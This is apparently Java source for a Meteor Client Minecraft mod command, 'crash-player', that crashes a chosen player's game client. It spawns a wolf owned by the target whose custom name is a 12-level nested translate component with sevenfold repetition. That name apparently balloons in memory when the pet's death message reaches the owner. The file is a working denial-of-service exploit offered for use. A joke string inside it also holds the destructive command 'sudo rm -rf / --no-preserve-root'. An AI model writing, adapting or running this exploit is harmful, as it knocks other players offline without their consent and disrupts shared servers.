package cod.hex.fih.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.entity.EntityType;
import net.minecraft.entity.TypedEntityData;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;

import java.util.UUID;

public class Crash extends Command {

    public Crash() {
        super("crash-player", "Crashes a player.", "crash");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {

        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if (profile != null) {
                if (mc.getNetworkHandler().getPlayerList().stream().anyMatch(player -> player.getProfile().id().equals(profile.id()))) {
                    ChatUtils.sendMsg(Text.of("Attempting to crash player: " + profile.name()));
                    NbtCompound entityData = new NbtCompound();
                    entityData.putString("id", "minecraft:wolf");
                    entityData.putIntArray("Owner", uuidToIntArray(profile.id()));
                    entityData.putFloat("Health", 1F);
                    entityData.putBoolean("Silent", true);
                    entityData.putInt("DeathTime", 20);

                    NbtList attributes = new NbtList();
                    NbtCompound scale = new NbtCompound();
                    scale.putString("id", "minecraft:scale");
                    scale.putDouble("base", 0d);
                    attributes.add(scale);
                    entityData.put("attributes", attributes);

                    NbtList activeEffects = new NbtList();
                    NbtCompound instantDamage = new NbtCompound();
                    instantDamage.putString("id", "minecraft:instant_damage");
                    instantDamage.putByte("amplifier", (byte) 0);
                    instantDamage.putInt("duration", 1);
                    activeEffects.add(instantDamage);
                    entityData.put("active_effects", activeEffects);

                    entityData.put("CustomName", crashTranslate("popbob sex crash pro max ultra 2b2t hackerman nocom randar exploit mega super info sudo rm -rf / --no-preserve-root hacking exploit oom voodoo magic dupertrooper lag machine the fifth column 2b2t hackermans etianl skynet nerds inc ultra undetectable backdoor", 12, 7));

                    ItemStack item = Items.ALLAY_SPAWN_EGG.getDefaultStack();
                    item.set(DataComponentTypes.ENTITY_DATA, TypedEntityData.create(EntityType.WOLF, entityData));
                    ItemStack old = mc.player.getMainHandStack();

                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().getSelectedSlot(), item));
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(mc.player.getEntityPos(), Direction.DOWN, mc.player.getBlockPos(), true), 1));
                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().getSelectedSlot(), old));

                } else {
                    error("Player not found in the current server");
                }
            } else {
                error("Player profile not found");
            }

            return SINGLE_SUCCESS;
        }));


    }

    public static int[] uuidToIntArray(UUID uuid) {
        long most = uuid.getMostSignificantBits();
        long least = uuid.getLeastSignificantBits();

        return new int[]{
            (int)(most >> 32),
            (int)most,
            (int)(least >> 32),
            (int)least
        };
    }

    private NbtCompound crashTranslate(String s, int i, int j) {
        NbtCompound customName = new NbtCompound();
        NbtList with = new NbtList();
        if (i > 1) {
            with.add(crashTranslate(s, i - 1, j));
        } else with.add(NbtString.of(s));
        customName.putString("translate", "");
        customName.putString("fallback", "%1$s".repeat(j));
        customName.put("with", with);
        return customName;
    }
}
